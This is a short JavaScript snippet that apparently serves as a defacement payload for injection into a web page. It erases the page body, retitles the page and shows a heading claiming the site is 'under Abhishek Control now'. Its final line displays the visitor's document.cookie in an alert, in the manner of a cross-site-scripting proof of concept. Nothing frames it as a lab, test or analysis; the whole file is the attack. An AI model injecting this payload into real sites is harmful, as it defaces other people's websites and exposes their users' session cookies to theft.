// Clear the current content of the body
document.body.innerHTML = "";

// Set the document title
document.title = "New Website Title";

// Create and append new elements
var newHeader = document.createElement('h1');
newHeader.textContent = "This website is under Abhishek Control now";
document.body.appendChild(newHeader);

var newParagraph = document.createElement('p');
newParagraph.textContent = "Welcome to the new version of the website.";
document.body.appendChild(newParagraph);

// Apply some basic styles
document.body.style.fontFamily = "Arial, sans-serif";
document.body.style.backgroundColor = "#f0f0f0";
document.body.style.margin = "0";
document.body.style.padding = "20px";

newHeader.style.color = "#333";
newParagraph.style.color = "#666";
alert("here_are_your_cookies:_"+document.cookie);